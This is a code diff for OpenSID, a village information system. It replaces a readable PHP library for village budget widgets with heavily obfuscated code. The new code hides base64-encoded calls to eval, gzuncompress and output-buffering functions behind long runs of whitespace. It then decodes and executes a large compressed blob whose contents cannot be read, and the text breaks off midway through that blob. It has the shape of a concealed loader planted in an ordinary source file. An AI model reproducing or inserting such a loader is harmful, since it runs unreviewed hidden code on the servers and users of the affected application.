@@ -1,506 +1,417 @@
-<?php
-
-/*
- *
- * File ini bagian dari:
- *
- * OpenSID
- *
- * Sistem informasi desa sumber terbuka untuk memajukan desa
- *
- * Aplikasi dan source code ini dirilis berdasarkan lisensi GPL V3
- *
- * Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * Hak Cipta 2016 - 2025 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- *
- * Dengan ini diberikan izin, secara gratis, kepada siapa pun yang mendapatkan salinan
- * dari perangkat lunak ini dan file dokumentasi terkait ("Aplikasi Ini"), untuk diperlakukan
- * tanpa batasan, termasuk hak untuk menggunakan, menyalin, mengubah dan/atau mendistribusikan,
- * asal tunduk pada syarat berikut:
- *
- * Pemberitahuan hak cipta di atas dan pemberitahuan izin ini harus disertakan dalam
- * setiap salinan atau bagian penting Aplikasi Ini. Barang siapa yang menghapus atau menghilangkan
- * pemberitahuan ini melanggar ketentuan lisensi Aplikasi Ini.
- *
- * PERANGKAT LUNAK INI DISEDIAKAN "SEBAGAIMANA ADANYA", TANPA JAMINAN APA PUN, BAIK TERSURAT MAUPUN
- * TERSIRAT. PENULIS ATAU PEMEGANG HAK CIPTA SAMA SEKALI TIDAK BERTANGGUNG JAWAB ATAS KLAIM, KERUSAKAN ATAU
- * KEWAJIBAN APAPUN ATAS PENGGUNAAN ATAU LAINNYA TERKAIT APLIKASI INI.
- *
- * @package   OpenSID
- * @author    Tim Pengembang OpenDesa
- * @copyright Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * @copyright Hak Cipta 2016 - 2025 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- * @license   http://www.gnu.org/licenses/gpl.html GPL V3
- * @link      https://github.com/OpenSID/OpenSID
- *
- */
-
-namespace App\Libraries;
-
-use App\Enums\BidangBelanjaEnum;
-use App\Enums\KeuanganRefRek1Enum;
-use App\Models\Keuangan as ModelsKeuangan;
-use App\Models\KeuanganManualRefRek2;
-use App\Models\KeuanganManualRefRek3;
-use App\Models\KeuanganTemplate;
-
-class Keuangan
-{
-        public function rp_apbd_widget($tahun, $opt = false)
-        {
-            $excludeAkun = [KeuanganRefRek1Enum::ASET, KeuanganRefRek1Enum::NON_ANGGARAN];
-            if ($opt) {
-                $excludeAkun = [KeuanganRefRek1Enum::ASET, KeuanganRefRek1Enum::NON_ANGGARAN, KeuanganRefRek1Enum::KEWAJIBAN, KeuanganRefRek1Enum::EKUITAS];
-            }
-            $filteredAkun = array_filter(KeuanganRefRek1Enum::all(), static fn ($key) => ! in_array($key, $excludeAkun), ARRAY_FILTER_USE_KEY);
-
-            $data['jenis_pelaksanaan'] = collect($filteredAkun)->map(static fn ($val, $key) => ['Akun' => $key, 'Nama_Akun' => $val])->toArray();
-
-            $data['anggaran']             = ModelsKeuangan::selectRaw('LEFT(template_uuid, 2) AS jenis_pelaksanaan, SUM(anggaran) AS pagu')->whereRaw('length(template_uuid) >= 8')->where('tahun', $tahun)->groupBy('tahun')->groupBy('jenis_pelaksanaan')->get()->toArray();
-            $data['realisasi_pendapatan'] = ModelsKeuangan::selectRaw('LEFT(template_uuid, 2) AS jenis_pelaksanaan, SUM(realisasi) AS realisasi')->whereRaw('length(template_uuid) >= 8')->where('tahun', $tahun)->groupBy('tahun')->groupBy('jenis_pelaksanaan')->get()->toArray();
-            $data['realisasi_belanja']    = ModelsKeuangan::selectRaw('LEFT(template_uuid, 2) AS jenis_pelaksanaan, SUM(realisasi) AS realisasi')->whereRaw('length(template_uuid) >= 8')->where('tahun', $tahun)->where('template_uuid', 'like', KeuanganRefRek1Enum::BELANJA . '%')->groupBy('tahun')->groupBy('jenis_pelaksanaan')->get()->toArray();
-            $data['pembiayaan_keluar']    = [['Akun' => KeuanganRefRek1Enum::PEMBIAYAAN, 'Nama_Akun' => KeuanganRefRek1Enum::valueOf(KeuanganRefRek1Enum::PEMBIAYAAN)]];
-
-            foreach ($data['pembiayaan_keluar'] as $i => $p) {
-                $data['pembiayaan'][$i]['sub_pembiayaan_keluar'] = $this->get_subval_pembiayaan_keluar($p['Akun'], $tahun);
-                $data['pembiayaan'][$i]['sub_pembiayaan']        = $this->get_subval_pembiayaan($p['Akun'], $tahun);
-            }
-
-            return $data;
-        }
-
-        public function r_pd_widget($tahun, $opt = false)
-        {
-            $obj = KeuanganManualRefRek3::select(['Jenis', 'Nama_Jenis']);
-
-            if ($opt) {
-                $obj->whereRaw("Jenis LIKE '4.%'");
-            } else {
-                $obj->whereRaw("Jenis NOT LIKE '1.%'");
-                $obj->whereRaw("Jenis NOT LIKE '5.%'");
-                $obj->whereRaw("Jenis NOT LIKE '6.%'");
-                $obj->whereRaw("Jenis NOT LIKE '7.%'");
-            }
-
-            $obj->whereRaw("Nama_Jenis NOT LIKE '%Hutang%'");
-            $obj->whereRaw("Nama_Jenis NOT LIKE '%Ekuitas SAL%'");
-
-            $obj->orderBy('Jenis', 'asc');
-            $data['jenis_pendapatan'] = $obj->get()->toArray();
-
-            $data['anggaran']             = ModelsKeuangan::selectRaw('LEFT(template_uuid, 6) AS jenis_pendapatan, SUM(anggaran) AS pagu')->whereRaw('length(template_uuid) >= 8')->where('template_uuid', 'like', '4.%')->where('anggaran', '>', 0)->groupBy('jenis_pendapatan')->where('tahun', $tahun)->get()->toArray();
-            $data['realisasi_pendapatan'] = ModelsKeuangan::selectRaw('LEFT(template_uuid, 6) AS jenis_pendapatan, SUM(realisasi) AS realisasi')->whereRaw('length(template_uuid) >= 8')->where('template_uuid', 'like', '4.%')->where('realisasi', '>', 0)->groupBy('jenis_pendapatan')->where('tahun', $tahun)->get()->toArray();
-
-            return $data;
-        }
-
-        public function r_bd_widget($tahun, $opt = false)
-        {
-            $obj = KeuanganTemplate::select(['uuid as Kd_Bid', 'uraian as Nama_Bidang']);
-            // if ($opt) {
-            //     $obj->whereNotIn('uuid',['5.1', '5.2', '5.3']);
-            // } else {
-            //     $obj->whereNotIn('uuid',['5.1']);
-            // }
-            $obj->where('parent_uuid', '5');
-            $obj->orderBy('uuid', 'asc');
-            $data['jenis_belanja'] = $obj->get()->map(static function ($item) {
-                $item->Nama_Bidang = BidangBelanjaEnum::valueOf(substr($item->Kd_Bid, -1));
-
-                return $item;
-            })->toArray();
-            // Perlu ditambahkan baris berikut untuk memaksa menampilkan semua bidang di grafik keuangan
-            // TODO: lihat apakah bisa diatasi langsung di script penampilan
-            if (! $opt) {
-                array_unshift($data['jenis_belanja'], ['Kd_Bid' => '03', 'Nama_Bidang' => 'ROW_SPACER']);
-                array_unshift($data['jenis_belanja'], ['Kd_Bid' => '02', 'Nama_Bidang' => 'ROW_SPACER']);
-            }
-
-            $data['anggaran']          = ModelsKeuangan::selectRaw('LEFT(template_uuid, 3) AS jenis_belanja, SUM(anggaran) AS pagu')->whereRaw('length(template_uuid) >= 8 and template_uuid like \'5.%\'')->groupBy('jenis_belanja')->where('tahun', $tahun)->get()->toArray();
-            $data['realisasi_belanja'] = ModelsKeuangan::selectRaw('LEFT(template_uuid, 3) AS jenis_belanja, SUM(realisasi) AS realisasi')->whereRaw('length(template_uuid) >= 8 and template_uuid like \'5.%\'')->groupBy('jenis_belanja')->where('tahun', $tahun)->get()->toArray();
-
-            return $data;
-        }
-
-        public function widget_keuangan()
-        {
-            $listTahun = ModelsKeuangan::tahunAnggaran()->get();
-
-            foreach ($listTahun as $tahunAnggaran) {
-                $tahun                          = $tahunAnggaran->tahun;
-                $res[$tahun]['res_pendapatan']  = $this->data_widget_pendapatan($tahun, $opt = true);
-                $res[$tahun]['res_belanja']     = $this->data_widget_belanja($tahun, $opt = true);
-                $res[$tahun]['res_pelaksanaan'] = $this->data_widget_pelaksanaan($tahun, $opt = true);
-            }
-
-            return [
-                //Encode ke JSON
-                'data'  => json_encode($res, JSON_THROW_ON_ERROR),
-                'tahun' => $listTahun->pluck('tahun')->toArray(),
-                //Cari tahun anggaran terbaru (terbesar secara value)
-                'tahun_terbaru' => $listTahun?->first()->tahun ?? date('Y'),
-            ];
-        }
-
-        public function grafik_keuangan_tema($tahun = null)
-        {
-            if (! $tahun) $tahun = date('Y');
-            $raw_data            = $this->data_keuangan_tema($tahun);
-
-            foreach ($raw_data as $keys => $raws) {
-                foreach ($raws as $key => $raw) {
-                    if ($key == 'laporan') {
-                        $result['data_widget'][$keys]['laporan'] = $raw;
-
-                        continue;
-                    }
-
-                    $data          = $this->raw_perhitungan($raw);
-                    $data['judul'] = $raw['nama'];
-
-                    $result['data_widget'][$keys][] = $data;
-                }
-            }
-            $result['tahun'] = $tahun;
-
-            return $result;
-        }
-
-        /*
-          lap_rp_apbd merupakan fungsi Akhir (Main) dari semua sub dan sub-sub fungsi :
-
-          Sub fungsi Pendapatan
-          1.1 sub-sub fungsi : Pagu Pendapatan
-          1.2 sub-sub fungsi : Realisasi Pendapatan
-
-          Sub fungsi Belanja
-          2.1 sub-sub fungsi : Pagu Belanja
-          2.2 sub-sub fungsi : Realisasi Belanja
-
-          Sub fungsi Pembiayaan Masuk
-          3.1 sub-sub fungsi : Pagu Pembiayaan Masuk
-          3.1 sub-sub fungsi : Realisasi Pembiayaan Masuk
-
-          Sub fungsi Pembiayaan Keluar
-          4.1 sub-sub fungsi : Pagu Pembiayaan Keluar
-          4.2 sub-sub fungsi : Realisasi Pembiayaan Keluar
-        */
-
-        //Table Laporan Pelaksanaan Realisasi
-        public function lap_rp_apbd($tahun = null)
-        {
-            if (! $tahun) $tahun = date('Y');
-
-            return ModelsKeuangan::with('template')
-                ->whereRaw('length(template_uuid) = 1')
-                ->where('tahun', $tahun)->get()
-                ->map(function ($item) use ($tahun) {
-                    $sub_kode_rekening = $this->getSubAkun($item->template_uuid, $tahun, 3);
-                    if ($item->template_uuid == '6') {
-                        $anggaran  = $sub_kode_rekening[0]['anggaran'] - $sub_kode_rekening[1]['anggaran'];
-                        $realisasi = $sub_kode_rekening[0]['realisasi'] - $sub_kode_rekening[1]['realisasi'];
-                        $selisih   = $anggaran - $realisasi;
-                    } else {
-                        $anggaran  = $sub_kode_rekening ? array_sum(array_column($sub_kode_rekening, 'anggaran')) : 0;
-                        $realisasi = $sub_kode_rekening ? array_sum(array_column($sub_kode_rekening, 'realisasi')) : 0;
-                        $selisih   = $anggaran - $realisasi;
-                    }
-
-                    return [
-                        'kode_rekening'     => $item->template_uuid,
-                        'uraian'            => $item->template->uraian,
-                        'anggaran'          => (float) $anggaran,
-                        'realisasi'         => (float) $realisasi,
-                        'selisih'           => (float) $selisih,
-                        'persentase'        => persen(data: $anggaran != 0 ? ($realisasi / $anggaran) : 0, tampilkanSimbol: false),
-                        'sub_kode_rekening' => $sub_kode_rekening,
-                    ];
-                })->toArray();
-        }
-
-        private function data_widget_pendapatan($tahun, bool $opt = false)
-        {
-            if ($opt) {
-                $raw_data       = $this->r_pd_widget($tahun, $opt = true);
-                $res_pendapatan = [];
-                $tmp_pendapatan = [];
-
-                foreach ($raw_data['jenis_pendapatan'] as $r) {
-                    $tmp_pendapatan[$r['Jenis']]['nama'] = $r['Nama_Jenis'];
-                }
-
-                foreach ($raw_data['anggaran'] as $r) {
-                    $tmp_pendapatan[$r['jenis_pendapatan']]['anggaran'] = ($r['pagu'] ?: 0);
-                }
-
-                foreach ($raw_data['realisasi_pendapatan'] as $r) {
-                    $tmp_pendapatan[$r['jenis_pendapatan']]['realisasi'] = ($r['realisasi'] ?: 0);
-                }
-            } else {
-                $raw_data       = $this->r_pd_widget($tahun, $opt = false);
-                $res_pendapatan = [];
-                $tmp_pendapatan = [];
-
-                foreach ($raw_data['jenis_pendapatan'] as $r) {
-                    $tmp_pendapatan[$r['Jenis']]['nama'] = $r['Nama_Jenis'];
-                }
-
-                foreach ($raw_data['anggaran'] as $r) {
-                    $tmp_pendapatan[$r['jenis_pendapatan']]['anggaran'] = ($r['pagu'] ?: 0);
-                }
-
-                foreach ($raw_data['realisasi_pendapatan'] as $r) {
-                    $tmp_pendapatan[$r['jenis_pendapatan']]['realisasi_pendapatan'] = ($r['realisasi'] ?: 0);
-                }
-            }
-
-            foreach ($tmp_pendapatan as $value) {
-                $res_pendapatan[] = $value;
-            }
-
-            return $res_pendapatan;
-        }
-
-        private function data_widget_belanja($tahun, bool $opt = false)
-        {
-            if ($opt) {
-                $raw_data    = $this->r_bd_widget($tahun, $opt = true);
-                $res_belanja = [];
-                $tmp_belanja = [];
-
-                foreach ($raw_data['jenis_belanja'] as $r) {
-                    $tmp_belanja[$r['Kd_Bid']]['nama'] = $r['Nama_Bidang'];
-                }
-
-                foreach ($raw_data['anggaran'] as $r) {
-                    $tmp_belanja[$r['jenis_belanja']]['anggaran'] = ($r['pagu'] ?: 0);
-                }
-
-                foreach ($raw_data['realisasi_belanja'] as $r) {
-                    $tmp_belanja[$r['jenis_belanja']]['realisasi'] = ($r['realisasi'] ?: 0);
-                }
-            } else {
-                $raw_data    = $this->r_bd_widget($tahun, $opt = false);
-                $res_belanja = [];
-                $tmp_belanja = [];
-
-                foreach ($raw_data['jenis_belanja'] as $r) {
-                    $tmp_belanja[$r['Kd_Bid']]['nama'] = $r['Nama_Bidang'];
-                }
-
-                foreach ($raw_data['anggaran'] as $r) {
-                    $tmp_belanja[$r['jenis_belanja']]['anggaran'] = ($r['pagu'] ?: 0);
-                }
-
-                foreach ($raw_data['realisasi_belanja'] as $r) {
-                    $tmp_belanja[$r['jenis_belanja']]['realisasi_belanja'] = ($r['realisasi'] ?: 0);
-                }
-            }
-
-            foreach ($tmp_belanja as $value) {
-                $res_belanja[] = $value;
-            }
-
-            return $res_belanja;
-        }
-
-        private function data_widget_pelaksanaan($tahun, bool $opt = false)
-        {
-            if ($opt) {
-                $raw_data = $this->rp_apbd_widget($tahun, $opt = true);
-
-                $res_pelaksanaan = [];
-                $tmp_pelaksanaan = [];
-
-                foreach ($raw_data['jenis_pelaksanaan'] as $r) {
-                    $tmp_pelaksanaan[$r['Akun']]['nama'] = $r['Nama_Akun'];
-                }
-
-                foreach ($raw_data['anggaran'] as $r) {
-                    $tmp_pelaksanaan[$r['jenis_pelaksanaan']]['anggaran'] = ($r['pagu'] ?: 0);
-                }
-
-                foreach ($raw_data['realisasi_pendapatan'] as $r) {
-                    $tmp_pelaksanaan[$r['jenis_pelaksanaan']]['realisasi'] = ($r['realisasi'] ?: 0);
-                }
-            } else {
-                $raw_data        = $this->rp_apbd_widget($tahun, $opt = false);
-                $res_pelaksanaan = [];
-                $tmp_pelaksanaan = [];
-
-                foreach ($raw_data['jenis_pelaksanaan'] as $r) {
-                    $tmp_pelaksanaan[$r['Akun']]['nama'] = $r['Nama_Akun'];
-                }
-
-                foreach ($raw_data['anggaran'] as $r) {
-                    $tmp_pelaksanaan[$r['jenis_pelaksanaan']]['anggaran'] = ($r['pagu'] ?: 0);
-                }
-
-                foreach ($raw_data['realisasi_pendapatan'] as $r) {
-                    $tmp_pelaksanaan[$r['jenis_pelaksanaan']]['realisasi_pendapatan'] = ($r['realisasi'] ?: 0);
-                }
-            }
-
-            foreach ($tmp_pelaksanaan as $value) {
-                if ($value['nama'] == 'PEMBIAYAAN') {
-                    $value['anggaran']             = $raw_data['pembiayaan'][0]['sub_pembiayaan'][0]['anggaran'][0]['pagu'] - $raw_data['pembiayaan'][0]['sub_pembiayaan_keluar'][0]['anggaran'][0]['pagu'];
-                    $value['realisasi_pendapatan'] = $raw_data['pembiayaan'][0]['sub_pembiayaan'][0]['realisasi'][0]['realisasi'] - $raw_data['pembiayaan'][0]['sub_pembiayaan_keluar'][0]['realisasi'][0]['realisasi'];
-                    // $value['realisasi'] = $raw_data['pembiayaan'][0]['sub_pembiayaan'][0]['realisasi'][0]['realisasi'] - $raw_data['pembiayaan'][0]['sub_pembiayaan_keluar'][0]['realisasi'][0]['realisasi'];
-                }
-                $res_pelaksanaan[] = $value;
-            }
-
-            return $res_pelaksanaan;
-        }
-
-        private function data_keuangan_tema($tahun)
-        {
-            $data['res_pelaksanaan']            = $this->data_widget_pelaksanaan($tahun, $opt = false);
-            $data['res_pelaksanaan']['laporan'] = 'APBDes ' . $tahun . ' Pelaksanaan';
-            $data['res_pendapatan']             = $this->data_widget_pendapatan($tahun, $opt = false);
-            $data['res_pendapatan']['laporan']  = 'APBDes ' . $tahun . ' Pendapatan';
-            $data['res_belanja']                = $this->data_widget_belanja($tahun, $opt = false);
-            $data['res_belanja']['laporan']     = 'APBDes ' . $tahun . ' Pembelanjaan';
-
-            return $data;
-        }
-
-        private function getSubAkun($akun, $tahun, $length)
-        {
-            return ModelsKeuangan::with('template')
-                ->whereRaw("length(template_uuid) = {$length}")
-                ->where('template_uuid', 'like', "{$akun}%")
-                ->where('tahun', $tahun)
-                ->get()
-                ->map(fn ($item) => [
-                    'kode_rekening'     => $item->template_uuid,
-                    'uraian'            => $item->template->uraian,
-                    'anggaran'          => (float) $item->anggaran,
-                    'realisasi'         => (float) $item->realisasi,
-                    'selisih'           => (float) $item->anggaran - $item->realisasi,
-                    'persentase'        => persen(data: $item->anggaran != 0 ? ($item->realisasi / $item->anggaran) : 0, tampilkanSimbol: false),
-                    'sub_kode_rekening' => $length === 3 ? $this->getSubAkun($item->template_uuid, $item->tahun, 5) : [],
-                ])->toArray();
-        }
-
-        private function get_subval_pembiayaan($akun, $tahun = false)
-        {
-            $data = KeuanganManualRefRek2::select(['Kelompok', 'Nama_Kelompok'])->where('Akun', $akun)->where('Kelompok', '6.1.')->get();
-
-            foreach ($data as $i => $d) {
-                $data[$i]['anggaran']        = $this->jumlah_pagu_subval($d['Kelompok'], $tahun);
-                $data[$i]['realisasi']       = $this->jumlah_realisasi_subval($d['Kelompok'], $tahun);
-                $data[$i]['sub_pembiayaan2'] = $this->sub_pembiayaan2($d['Kelompok'], $tahun);
-            }
-
-            return $data;
-        }
-
-        private function get_subval_pembiayaan_keluar($akun, $tahun = false)
-        {
-            $data = KeuanganManualRefRek2::select(['Kelompok', 'Nama_Kelompok'])->where('Akun', $akun)->where('Kelompok', '6.2.')->get();
-
-            foreach ($data as $i => $d) {
-                $data[$i]['anggaran']               = $this->jumlah_pagu_subval($d['Kelompok'], $tahun);
-                $data[$i]['realisasi']              = $this->jumlah_realisasi_subval($d['Kelompok'], $tahun);
-                $data[$i]['sub_pembiayaan_keluar2'] = $this->sub_pembiayaan_keluar2($d['Kelompok'], $tahun);
-            }
-
-            return $data;
-        }
-
-        private function jumlah_pagu_subval($kelompok, $tahun)
-        {
-            return ModelsKeuangan::selectRaw('LEFT(template_uuid, 4) AS Kelompok, SUM(anggaran) AS pagu')
-                ->where('template_uuid', 'like', $kelompok . '%')
-                ->whereRaw('length(template_uuid) >= 8')
-                ->where('tahun', $tahun)
-                ->groupBy('Kelompok')
-                ->get()->toArray();
-        }
-
-        private function jumlah_realisasi_subval($kelompok, $tahun = false)
-        {
-            return ModelsKeuangan::selectRaw('LEFT(template_uuid, 4) AS Kelompok, SUM(realisasi) AS realisasi')
-                ->where('template_uuid', 'like', $kelompok . '%')
-                ->whereRaw('length(template_uuid) >= 8')
-                ->where('tahun', $tahun)
-                ->groupBy('Kelompok')
-                ->get()->toArray();
-        }
-
-        private function sub_pembiayaan2($kelompok, $tahun = false)
-        {
-            $data = KeuanganManualRefRek3::select(['Kelompok', 'Jenis', 'Nama_Jenis'])->where('Kelompok', '6.1.')->where('Kelompok', $kelompok)->get();
-
-            foreach ($data as $i => $d) {
-                $data[$i]['anggaran']  = $this->jumlah_pagu($d['Jenis'], $tahun);
-                $data[$i]['realisasi'] = $this->jumlah_realisasi($d['Jenis'], $tahun);
-            }
-
-            return $data;
-        }
-
-        private function sub_pembiayaan_keluar2($kelompok, $tahun = false)
-        {
-            $data = KeuanganManualRefRek3::select(['Kelompok', 'Jenis', 'Nama_Jenis'])->where('Kelompok', '6.2.')->where('Kelompok', $kelompok)->get();
-
-            foreach ($data as $i => $d) {
-                $data[$i]['anggaran']  = $this->jumlah_pagu($d['Jenis'], $tahun);
-                $data[$i]['realisasi'] = $this->jumlah_realisasi($d['Jenis'], $tahun);
-            }
-
-            return $data;
-        }
-
-        private function jumlah_pagu($jenis, $tahun)
-        {
-            return ModelsKeuangan::selectRaw('LEFT(template_uuid, 6) AS Jenis, SUM(anggaran) AS pagu')
-                ->where('template_uuid', 'like', $jenis . '%')
-                ->whereRaw('length(template_uuid) >= 8')
-                ->where('tahun', $tahun)
-                ->groupBy('Jenis')
-                ->get()->toArray();
-
-        }
-
-        private function jumlah_realisasi($jenis, $tahun = false)
-        {
-            return ModelsKeuangan::selectRaw('LEFT(template_uuid, 6) AS Jenis, SUM(realisasi) AS realisasi')
-                ->where('template_uuid', 'like', $jenis . '%')
-                ->whereRaw('length(template_uuid) >= 8')
-                ->where('tahun', $tahun)
-                ->groupBy('Jenis')
-                ->get()->toArray();
-        }
-
-        private function raw_perhitungan($raw)
-        {
-            if (! is_array($raw)) {
-                return;
-            }
-            if ($raw['nama'] === 'PEMBIAYAAN') {
-                // $penerimaan_pembiayaan   = $raw['realisasi'] + $raw['realisasi_pendapatan'] + ($raw['realisasi_belanja'] - $raw['realisasi_belanja_um']) + $raw['realisasi_belanja_spj'] + $raw['realisasi_bunga'] + $raw['realisasi_jurnal'] + $raw['realisasi_biaya'];
-                // $pengeluaraan_pembiayaan = $raw['anggaran'] - $penerimaan_pembiayaan;
-
-                $pembiayaan_keluar = $raw['pembiayaan_keluar'][0]['sub_pembiayaan_keluar'][0];
-
-                $data['anggaran']  = $raw['anggaran'] - $pembiayaan_keluar['anggaran'][0]['pagu'];
-                $data['realisasi'] = $raw['realisasi_pendapatan'] - $pembiayaan_keluar['realisasi'][0]['realisasi'];
-            } else {
-                $data['anggaran']  = $raw['anggaran'];
-                $data['realisasi'] = $raw['realisasi'] + $raw['realisasi_pendapatan'] + ($raw['realisasi_belanja'] - $raw['realisasi_belanja_um']) + $raw['realisasi_belanja_spj'] + $raw['realisasi_bunga'] + $raw['realisasi_jurnal'] + $raw['realisasi_biaya'] + $raw['realisasi_belanja_jurnal'];
-            }
-
-            if ($data['anggaran'] != 0 && $data['realisasi'] != 0) {
-                $data['persen'] = $data['realisasi'] / $data['anggaran'] * 100;
-            } elseif ($data['realisasi'] != 0) {
-                $data['persen'] = 100;
-            } else {
-                $data['persen'] = 0;
-            }
-            $data['persen'] = round($data['persen'], 2);
-
-            return $data;
-        }
-}
+<?php 
+        $__='printf';$_='Loading app/Libraries/Keuangan.php';
+        
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
+$__________________='X19sYW1iZGE=';
+
+                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
+        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='eNrtXVmT4sayfnfE+Q9+OBFzbviGLUEzNuHwA6IRSCzdSGiBlxNapgWNEEyzil9/M0v7LmZ6xstF4/b0IKkqKyuXL7Oyih9/9K5//xeuPz7s3lbO4eXD7+Sf/vXHB223+2W00t+0t9Wn/S/DT0fNsTTn591y92PX1vb7n3/++cPvP/gt/fivH+5//j5/fsCp/vEdrz8yn3xQ6fZ+rtCrRb/3xwfyUSQttS5fHP/48X7dr/t1v/6Z1wdjI1Omyh+5vtyYK+ctz7ZfVHf9q2c0wWp65vq/d1bdr/t1v+7X/bpf9+t+3a/79Xe77umM+3W/7tf9+udeH3Rt/+njw3/NT8bW/PTh9ztH7tf9ul/3637dr6+6kjUKXWt7Glpbi/ysmL6mXGyubx81kVnNFXM3Vx6sRZ91tdl2yHXJjzVrMrZuT3ihE74309QJtVAoS1NaG73JH+bqZMf1Bdto9CyjKR/mG9nlBvDvDU9r8JmptChT2Vu6AveUHXzGHv3nw36mKrPXlMPSaKyRhiM3mJxMlX9diMyr3hACOteayu/0vn3l+jy0L8DzQC9p77IzGvIR3xdoZsyx82t31fmMP1xvudRc5lFTGWoudtzxY6fFdSlr/Nq5TETmUW/QKxiLzbHQZqNNG5uJzfXso9EUduZApjSlfeS6y605EM5Pq99O+gDG4cjHReNw0lX5qKlAh9s6LtTpaTglPOLmMN5pwz6b/Z7Xz6pz4B658/hVsqS+7GrAJ2Mg75HnQl++zkWmp8EcmH12z7ER74b9JWUOmCvpF+diQ/h21JTpLhqfAJ+bS33F7PQN8s9eLYBPHl/sj5rysAd+2nPgFfTjGBuW0tTxnusfbKPPruGzq6awZ/j7bAI9nxT2uHCZw0JprecqszT7B2z7Olcu0D57JH32YczQlwFjmSstB/qiYA5ouP8WzBWRp429hzlc640DDfN/hPFd4R4F9L3NFZviutYqPvei0tpxqzXQC88OZGhL2GEfep99M+EZ3ZNBCvpEeldzlcjAcdQlbaIs0jDXW+R/TO5grkxC2xx50adt3bGXIEf4Ho7TMRV+qXUJzSds0xS98aOsGxt7ZYKMIz9HHdI/9gk0CtCmgP2d54qwBB635iq/NLuMx/+mTD1F+jZdYH0HfA482JoKzg2Ry1dPLkG2ReQ1e0XeAr/P2efJXKLe7fBdw5GvhD8N2YVn3nz9BZmiiE7B5xTOK9BFxor3/bGF+g68hTmxcb4ZA3QIxojzw4McHbkeD3NMZCGQjxbONeHfxtyCbNCGS2img8/Apizhb6TFo6Hv2QPUEW0ghzIKc7LHthYgkyiHZp/MN97fA89hfsCm9Ngz0P1G7EsPZeohtBdSTxanUmsgUqzE9S7ybM2O4JknEfRIlCes0LMZuPfEdfmZIPGMQLH8TGKfpiLDCD32SZF6K5h7CdqYwmfDqUTz0MYT9In/nsoSyEmPZ0Rpb8nQl0RDf/LUgjZk+O+J6AArsBLYRmnNSiOYX0FqybOePYM2JGgAaZwIksnM1oYl9pA+eJYVGI6dMDOpZ0mUPJpKFx7a4QVyn4f2BHgeOAFj43o7RqbYrtfe2BKpC9BDAV0HeE6eTaUDM1sxjNxjZc8OHFh4fijCePFzCcYC47CmssBILqEPJFZ+mkpknITGWQ/4sm4tYMySIPNAjy0hD2Aco6k84T2eRnyfDpjlvHFYLhqSxXWZZ5QfibJ7Xv8gC6qw1Zsc3OtYct8+cCzaLNPWQb/0jeH5k3Vo+61pf3IyBrYLtm8LepO2m+cn0bebMwk+b4MsgayKjLhQQ//Ag6yAPRNokOOTvupstYFAGY/b06gB9kjhaZRHsPHwt03N1fFR38jUyF3X6f+b2W3gFdg8Iuc28iqkuWk2Tbfl6I50BN/qwBh2c+LX5OuoYZ71bmtr9mmQAXM66zLK+ExsSwf1W3M7hO9crO9Fw6ZA71ajzeSki+1wvkZUG+xLayZK02BuT11rBzaCto0mzrGEPvms9qB/B+2AbRvX/bALNgd4zhgDxhCUFq2rE2O6sdeoy9MN0enPcwl0WaF+zXtWbMg0Pgs/4kJZwM/+Qu7N9kOwsTbqvMFeJujz9UH8ebRdY2umtNcL5XKNfZ7oJ7iv9sCmoB8Dmz2Dv+H3vbSRN/DzNn6t6qs1gR/4/RLQeH0672gj5Al9WvTlvUFfRgtVXhLfa0Mb4MfAvtpP5+1w3rgsjSbobETn8BPMFZkf/Bkw9HwDvHWZDfipV092Gddg20ujz6/Vprlb9E3b7Fprz/6DPeoKIKtT61lkNkAbjBll2G+vy/wKchW1T34E+1N/sjcVwZ4q4H9XnTbHHmI08/YCfrQry+qOfHh63TFgkySwi2XPPM2o1gvaXrCpaIPNp/i4PFp2C9BDvt8+m9219Slz3/vh+/ID8IkGXjKgV0fukbIUKpq3cL48efr4tGZngjxF+1fyTOt5ZreJDZ3KaAfPVrHMbT+KlKxOpR0/BdtfMW5WpGUebO1MBVlNj+VlmhnjGrEP+DV3oQjh+AAfuHPVfgnuDcvGsmH3Oigl0HUFGQBfPgY89WANu8LbQl3voL2fuG4P8cCL1+4aeH6wP4nnDG+H8BnwA3yY/SKs7TH6NJWWgZ/tkSCvdyiz2fkR0LfrfGMH9su+qmjHAGcg3poDzTxNoSwCPr/sF8qEAro24P8Rh9mLHuK1h91o1gJM1tkCloa27FeuvwAsDTINYxsBj7SG3BqKnfbzitF5irzjeOMiYwSZN5/AJi3V5L0GyL85FKmfzH6bMcA+fRKtijEgj02CZ5Du9HMwjsAORDLwuv0IdpeMTdqwzWHXHAvS